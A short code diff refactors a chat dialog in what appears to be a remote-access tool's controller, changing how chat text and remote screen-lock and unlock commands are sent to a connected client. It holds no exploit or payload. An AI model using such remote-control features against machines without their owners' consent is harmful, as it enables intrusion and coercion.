@@ -53,7 +53,7 @@ BOOL CChat::OnInitDialog()
     m_editNewMsg.SetLimitText(4079);
     // TODO: Add extra initialization here
     BYTE bToken = COMMAND_NEXT_CHAT;
-    m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
+    m_ContextObject->Send2Client(&bToken, sizeof(BYTE));
     SetIcon(m_hIcon, TRUE);			// Set big icon
     SetIcon(m_hIcon, FALSE);		// Set small icon
 
@@ -89,7 +89,7 @@ void CChat::OnButtonSend()
         return; // 发送消息为空不处理
     }
     m_editTip.ShowWindow(SW_HIDE);
-    m_iocpServer->Send2Client(m_ContextObject, (LPBYTE)str, lstrlen(str) + sizeof(char));
+    m_ContextObject->Send2Client((LPBYTE)str, lstrlen(str) + sizeof(char));
     SYSTEMTIME st;
     GetLocalTime(&st);
     char Text[5120] = { 0 };
@@ -171,11 +171,11 @@ void CChat::OnBnClickedButton_LOCK()
 {
 
     BYTE bToken = COMMAND_CHAT_SCREEN_LOCK;
-    m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
+    m_ContextObject->Send2Client(&bToken, sizeof(BYTE));
 }
 
 void CChat::OnBnClickedButton_UNLOCK()
 {
     BYTE bToken = COMMAND_CHAT_SCREEN_UNLOCK;
-    m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
+    m_ContextObject->Send2Client(&bToken, sizeof(BYTE));
 }
